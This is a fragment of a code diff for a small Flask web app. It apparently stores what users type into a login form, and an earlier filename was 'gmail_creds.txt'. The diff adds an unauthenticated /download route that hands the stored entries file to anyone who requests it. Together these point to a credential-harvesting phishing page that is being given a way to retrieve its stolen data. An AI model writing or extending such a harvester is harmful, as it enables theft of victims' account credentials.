@@ -1,8 +1,8 @@
 from flask import Flask, request, render_template_string, redirect
 from datetime import datetime
+from flask import send_file
 
 app = Flask(__name__)
-DATA_FILE = "gmail_creds.txt"
 DATA_FILE = "entries.txt"
 
 LOGIN_HTML = """
@@ -173,6 +173,13 @@ def save():
 
     print("SAVED:", msg)
     return "Data saved!"
+
+@app.route("/download")
+def download():
+    try:
+        return send_file(DATA_FILE, as_attachment=True)
+    except Exception as e:
+        return f"File not found. Error: {e}"
 
 
 if __name__ == "__main__":
